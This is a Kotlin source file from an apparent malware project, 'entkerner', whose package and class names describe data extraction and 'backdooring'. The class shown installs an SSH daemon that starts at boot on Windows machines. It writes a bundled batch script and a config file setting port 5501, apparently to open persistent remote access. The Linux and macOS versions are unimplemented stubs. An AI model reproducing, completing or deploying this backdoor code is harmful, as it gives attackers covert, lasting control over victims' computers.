package net.kerner.entkerner.extractors.ssh

import io.ktor.client.*
import net.kerner.entkerner.Entkerner
import net.kerner.entkerner.abstract.AbstractBackdooringWorker
import net.kerner.entkerner.abstract.SystemFileURI
import net.kerner.entkerner.extractors.standart.OnBootExecutorWorker
import net.kerner.entkerner.io.FileUtils.Linux.userHome
import net.kerner.entkerner.io.FileUtils.Windows.appData
import net.kerner.entkerner.io.JavaClassLoaderResources
import net.kerner.entkerner.io.nullPath
import net.kerner.entkerner.io.nullPaths
import net.kerner.entkerner.model.SystemType
import java.io.BufferedInputStream
import java.io.File
import java.nio.file.Path
import kotlin.io.path.div

class SSHDaemonInstaller(
    httpClient: HttpClient,
    entkerner: Entkerner,
    val port: Int = 5501
) : OnBootExecutorWorker("SSHDaemon", httpClient, entkerner) {
    override val name = "SSHDaemonBackdooringWorker"

    override fun installWindows(file: File): File {
        if (entkerner.system == SystemType.WINDOWS) {
            val sshDaemonFile = File(file, "RunSshDaemon.bat")
            sshDaemonFile.createNewFile()
            sshDaemonFile.writeBytes(JavaClassLoaderResources.getResource("windows/SshDaemon.bat").readBytes())
            val sshDaemonConfigFile = File(file, "SshDaemonConf.txt")
            sshDaemonConfigFile.createNewFile()
            sshDaemonConfigFile.writeBytes(port.toString().toByteArray())
            return sshDaemonFile
        }
        return file
    }

    override fun installLinux(file: File) {
        TODO("Not yet implemented")
    }

    override fun installDarwin(file: File) {
        TODO("Not yet implemented")
    }
}